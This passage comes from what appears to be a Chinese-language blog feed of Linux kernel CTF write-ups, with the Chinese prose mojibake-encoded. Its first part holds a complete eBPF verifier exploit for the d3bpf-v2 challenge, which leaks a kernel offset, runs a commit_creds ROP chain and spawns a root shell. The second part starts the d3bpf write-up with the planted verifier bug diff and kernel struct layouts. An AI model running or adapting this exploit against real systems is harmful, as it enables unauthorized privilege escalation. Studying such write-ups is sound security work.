class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> *prog_fd_out, <span class="keyword">char</span> *write_buf, <span class="keyword">size_t</span> write_nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = <span class="number">2</span>,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write_nbytes != write(socks[<span class="number">1</span>], write_buf, write_nbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] write not so good\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        close(prog_fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_REG BPF_REG_8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack()                                    \</span></span><br><span class="line"><span class="meta">    BPF_MOV64_IMM(BPF_REG_9, 64),                   \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(EXP_REG, 1),                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9), \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_0, EXP_REG)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">leak_insn</span>[] =</span> &#123;</span><br><span class="line">            attack(),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (<span class="number">16</span> - <span class="number">8</span>)),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_4, <span class="number">8</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),</span><br><span class="line">            BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0xFF</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(leak_insn, <span class="keyword">sizeof</span>(leak_insn) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>, buf, <span class="number">0x100</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        save_status();</span><br><span class="line">        signal(SIGSEGV, &amp;get_shell);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset = strtoul(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = kernel_offset + <span class="number">0xffffffff810d7210</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = kernel_offset + <span class="number">0xffffffff82e6e860</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_ret = kernel_offset + <span class="number">0xffffffff81097050</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode = kernel_offset + <span class="number">0xffffffff81e0100b</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">        rop_chain[i++] = pop_rdi_ret;</span><br><span class="line">        rop_chain[i++] = init_cred;</span><br><span class="line">        rop_chain[i++] = commit_creds;</span><br><span class="line">        rop_chain[i++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">        rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = &amp;get_shell;</span><br><span class="line">        rop_chain[i++] = user_cs;</span><br><span class="line">        rop_chain[i++] = user_rflags;</span><br><span class="line">        rop_chain[i++] = user_sp;</span><br><span class="line">        rop_chain[i++] = user_ss;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">attack_insn</span>[] =</span> &#123;</span><br><span class="line">            attack(),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (<span class="number">0x100</span> - <span class="number">8</span>)),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_4, <span class="number">8</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),</span><br><span class="line">            BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(attack_insn, <span class="keyword">sizeof</span>(attack_insn) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>, rop_chain, <span class="number">0x100</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230111180153062.png"                      alt="image-20230111180153062"                ></p><p>é¦–å…ˆè¿è¡Œexpè§¦å‘<code>soft panic</code>å¯ä»¥çœ‹åˆ°åœ¨å…¶ä¸­å­˜åœ¨é…·ä¼¼kernelä»£ç æ®µçš„åœ°å€ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¡ç®—å¾—åˆ°<code>kernel_offset</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230111180450710.png"                      alt="image-20230111180450710"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230111180529651.png"                      alt="image-20230111180529651"                ></p><p>æœ€åæˆåŠŸææƒã€‚</p><hr><p>é¢˜ç›®æ”¾åœ¨:<a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf-v2.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf-v2.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å› ä¸ºè¿‘æœŸä¸€ç›´åœ¨ç©å†…æ ¸ï¼Œåœ¨æŠŠè¿™ç¯‡æ–‡ç« å†™å®Œä¹‹åå°±ä¸ä¼šä¸€ç›´æ›´æ–°å†…æ ¸ç›¸å…³çš„äº†ï¼Œåç»­çš„æ‰“ç®—æ˜¯å­¦ä¹ å®Œé€ƒé€¸çš„å†…å®¹ä¹‹åå°±å¼€å§‹è¿›è¡Œåˆ·é¢˜å’Œå¤ç°æ¯”èµ›çš„ç»ƒä¹ äº†ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åˆ†æé¢˜ç›®&quot;&gt;&lt;a href=&quot;#åˆ†æé¢˜ç›®&quot; class=&quot;headerlink&quot; title=&quot;åˆ†æé¢˜ç›®&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>d3bpf</title>
    <link href="https://cv196082.gitee.io/2023/01/06/d3bpf/"/>
    <id>https://cv196082.gitee.io/2023/01/06/d3bpf/</id>
    <published>2023-01-06T11:55:01.000Z</published>
    <updated>2023-01-06T11:55:39.052Z</updated>
    
    <content type="html"><![CDATA[<p>è™½ç„¶åœ¨ä¹‹å‰å‡ºè¿‡å‡ ç¯‡å…³äºbpfçš„æ–‡ç« ï¼Œä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰å¾—åˆ°å¾ˆæ·±å±‚æ¬¡çš„ç†è§£ï¼Œæ–‡ç« çš„expåŸºæœ¬å°±æ˜¯copyçš„ã€‚å¹¶ä¸”ï¼ŒD3^CTF 2022è¿˜æœ‰ä¸¤é“ebpféœ€è¦å¤ç°ï¼Œæ‰€ä»¥ç°åœ¨å°±é€‰æ‹©äº†å¤ç°ä¸€ä¸‹ã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/fs/fs_context.c b/fs/fs_context.c</span><br><span class="line">index <span class="number">2834</span>d1afa.<span class="number">.0</span>a79c9099 <span class="number">100644</span></span><br><span class="line">--- a/fs/fs_context.c</span><br><span class="line">+++ b/fs/fs_context.c</span><br><span class="line">@@ <span class="number">-530</span>,<span class="number">7</span> +<span class="number">530</span>,<span class="number">7</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_parse_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function">       param-&gt;key)</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">if</span> (len &gt; PAGE_SIZE - <span class="number">2</span> - size)</span><br><span class="line">+<span class="keyword">if</span> (size + len + <span class="number">2</span> &gt; PAGE_SIZE) <span class="comment">// patch for CVE-2022-0185</span></span><br><span class="line"> <span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span> (<span class="built_in">strchr</span>(param-&gt;key, <span class="string">&#x27;,&#x27;</span>) ||</span><br><span class="line">     (param-&gt;type == fs_value_is_string &amp;&amp;</span><br><span class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="line">index <span class="number">37581919</span>e.<span class="number">.8e98</span>d4af5 <span class="number">100644</span></span><br><span class="line">--- a/kernel/bpf/verifier.c</span><br><span class="line">+++ b/kernel/bpf/verifier.c</span><br><span class="line">@@ <span class="number">-6455</span>,<span class="number">11</span> +<span class="number">6455</span>,<span class="number">11</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> adjust_scalar_min_max_vals(struct bpf_verifier_env *env,</span><br><span class="line"> scalar_min_max_lsh(dst_reg, &amp;src_reg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> BPF_RSH:</span><br><span class="line">-<span class="keyword">if</span> (umax_val &gt;= insn_bitness) &#123;</span><br><span class="line">-<span class="comment">/* Shifts greater than 31 or 63 are undefined.</span></span><br><span class="line"><span class="comment">- * This includes shifts by a negative number.</span></span><br><span class="line"><span class="comment">- */</span></span><br><span class="line">-mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span><br><span class="line">+<span class="keyword">if</span> (umin_val &gt;= insn_bitness) &#123;</span><br><span class="line">+<span class="keyword">if</span> (alu32)</span><br><span class="line">+__mark_reg32_known(dst_reg, <span class="number">0</span>);</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+__mark_reg_known_zero(dst_reg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (alu32)</span><br><span class="line">diff --git a/net/packet/af_packet.c b/net/packet/af_packet.c</span><br><span class="line">index <span class="number">6b</span>bc7a448..d949fdf00 <span class="number">100644</span></span><br><span class="line">--- a/net/packet/af_packet.c</span><br><span class="line">+++ b/net/packet/af_packet.c</span><br><span class="line">@@ <span class="number">-4448</span>,<span class="number">9</span> +<span class="number">4448</span>,<span class="number">10</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> packet_set_ring(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> out_free_pg_vec:</span><br><span class="line">-bitmap_free(rx_owner_map);</span><br><span class="line">-<span class="keyword">if</span> (pg_vec)</span><br><span class="line">+<span class="keyword">if</span> (pg_vec) &#123;</span><br><span class="line">+bitmap_free(rx_owner_map); <span class="comment">// patch for CVE-2021-22600</span></span><br><span class="line"> free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);</span><br><span class="line">+&#125;</span><br><span class="line"> out:</span><br><span class="line"> <span class="keyword">return</span> err;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¢˜ç›®æ‹¿åˆ°æ‰‹ä¹‹åæ˜¯ä¸€ä¸ªdiffæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶æœ€ä¸Šé¢æœ‰ä¸€ä¸ªpatchæ˜¯ä¸ºäº†ä¿®å¤<code>CVE-2022-0185</code>ï¼Œåœ¨æ–‡ä»¶çš„æœ€ä¸‹é¢æ˜¯ä¸€ä¸ªpatchï¼Œä¹Ÿæ˜è¯´äº†å°±æ˜¯ä¸ºäº†ä¿®å¤<code>CVE-2021-22600</code>ï¼Œä¸è¿‡ä¸Šé¢è¿˜æœ‰ä¸€æ®µä¿®æ”¹ã€‚</p><p>ä¸Šé¢å°†åŸæœ¬çš„è¯­å¥åˆ é™¤äº†ï¼Œå¹¶ä¸”æ·»åŠ äº†å‡ æ¡è¯­å¥ã€‚åŸæœ¬çš„è¯­å¥ä¸­çš„ï¼Œåœ¨è¿›è¡ŒRSHæ—¶ï¼Œå¦‚æœè¶…è¿‡31æˆ–åˆ™63åˆ™å°†å¯„å­˜å™¨è®¾ç½®ä¸ºunkownã€‚ä½†æ˜¯åœ¨ä¿®æ”¹è¿‡åçš„è¯­å¥ä¸­å¦‚æœè¶…è¿‡äº†63æˆ–è€…31ä¸æ˜¯è®¾ç½®ä¸ºunknownè€Œæ˜¯é»˜è®¤è®¾ç½®ä¸º0ã€‚</p><p>è¿™é‡Œå› ä¸ºæ¶æ„çš„åŸå› ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨å³ç§»64ä½å¾—åˆ°çš„ç»“æœä¸º1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 1 &gt;&gt; 64</span><br><span class="line"><span class="variable">$3</span> = 0x1</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥é¢˜ç›®è¿™é‡Œç»™çš„æ¼æ´ä¸ºï¼Œåœ¨verifierä¸º0ä½†æ˜¯åœ¨runtimeä¸º1çš„å¯„å­˜å™¨ã€‚</p><p>è§‚å¯Ÿé¢˜ç›®çš„å¯åŠ¨å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -m 128M \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 kaslr quiet&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -cpu kvm64,+smep,+smap \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -nographic \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure><p>åŸºæœ¬ä¸Šèƒ½å¼€çš„éƒ½å¼€äº†ï¼Œå¯åŠ¨è™šæ‹Ÿæœºä¹Ÿå¯ä»¥æŸ¥çœ‹ï¼Œå…¶å®kptiä¹Ÿæ˜¯æ‰“å¼€äº†çš„ã€‚</p><h2 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h2><h3 id="æ³„æ¼"><a href="#æ³„æ¼" class="headerlink" title="æ³„æ¼"></a>æ³„æ¼</h3><p>å› ä¸ºæˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªverifierä¸º0ï¼Œruntimeä¸º1çš„å¯„å­˜å™¨æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•è¶Šç•Œè¯»æ¥é€ æˆæ³„æ¼ï¼Œé¦–å…ˆå°±éœ€è¦è®¤è¯†<code>bpf_map</code>ç»“æ„ä½“:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line"><span class="comment">/* The first two cachelines with read-mostly members of which some</span></span><br><span class="line"><span class="comment"> * are also accessed in fast-path (e.g. ops, max_entries).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> <span class="title">map_type</span>;</span></span><br><span class="line">u32 key_size;</span><br><span class="line">u32 value_size;</span><br><span class="line">u32 max_entries;</span><br><span class="line">u32 map_flags;</span><br><span class="line"><span class="keyword">int</span> spin_lock_off; <span class="comment">/* &gt;=0 valid offset, &lt;0 error */</span></span><br><span class="line">u32 id;</span><br><span class="line"><span class="keyword">int</span> numa_node;</span><br><span class="line">u32 btf_key_type_id;</span><br><span class="line">u32 btf_value_type_id;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">u32 btf_vmlinux_value_type_id;</span><br><span class="line"><span class="keyword">bool</span> bypass_spec_v1;</span><br><span class="line"><span class="keyword">bool</span> frozen; <span class="comment">/* write-once; write-protected by freeze_mutex */</span></span><br><span class="line"><span class="comment">/* 22 bytes hole */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span></span><br><span class="line"><span class="comment"> * particularly with refcounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic64_t</span> refcnt ____cacheline_aligned;</span><br><span class="line"><span class="keyword">atomic64_t</span> usercnt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">freeze_mutex</span>;</span></span><br><span class="line">u64 writecnt; <span class="comment">/* writable mmap cnt; protected by freeze_mutex */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬åœ¨å¼€å§‹å®šä¹‰ç±»å‹ä¸º<code>BPF_MAP_TYPE_ARRAY</code>é‚£ä¹ˆç»“æ„ä½“å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line">u32 elem_size;</span><br><span class="line">u32 index_mask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array_aux</span> *<span class="title">aux</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> value[<span class="number">0</span>] __aligned(<span 